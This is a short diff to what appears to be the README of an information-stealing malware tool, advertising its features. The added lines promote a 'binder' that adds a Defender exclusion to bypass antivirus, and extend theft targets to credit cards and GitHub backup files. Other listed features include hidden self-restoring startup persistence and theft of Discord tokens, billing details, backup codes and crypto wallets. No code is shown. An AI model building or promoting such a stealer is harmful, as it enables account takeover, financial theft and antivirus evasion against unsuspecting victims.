@@ -63,11 +63,13 @@
 
 > Percistance Hidden Startup + if reg get deleted = auto come back :)
 >
-> Discord Token, Friends with rare badges
+> Binder, will add exclusion to your file to bypass defender.
+> 
+> Discord Token, Friends with rare badges, Credit card
 >
 > Discord Info - Username, Phone number, Email, Billing, Nitro Status & Backup Codes
 >
-> Steal Backup .txt [ Discord, Epic Games ]
+> Steal Backup .txt [ Discord, Epic Games, Github ]
 >
 > Grabs crypto wallets -
 > 💸 Zcash
